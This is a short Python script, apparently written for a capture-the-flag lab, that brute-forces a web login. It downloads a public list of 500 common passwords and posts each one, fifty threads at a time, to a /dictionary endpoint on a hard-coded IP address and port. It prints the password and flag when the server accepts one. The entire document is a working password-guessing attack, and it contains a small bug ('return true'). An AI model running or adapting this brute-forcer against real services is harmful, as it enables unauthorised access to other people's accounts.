import requests
from concurrent.futures import ThreadPoolExecutor

ip = '94.237.63.132'
port = '37816'

#Password wordlist

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()


def dictionary_stream(password):
    print(f"Attempted Password: {password}")
    try:
        response = requests.post(f"http://{ip}:{port}/dictionary", data={'password':password})

    #check if server accepts the response
        if response.ok and 'flag' in response.json():
            print(f"[+] Password found: {password}")
            print(f"[+] Flag: {response.json()['flag']}")
            return true
    except Exception as e:
        return False

with ThreadPoolExecutor(max_workers=50) as pool:
    for result in pool.map(dictionary_stream,passwords):
        if result:
            break
        
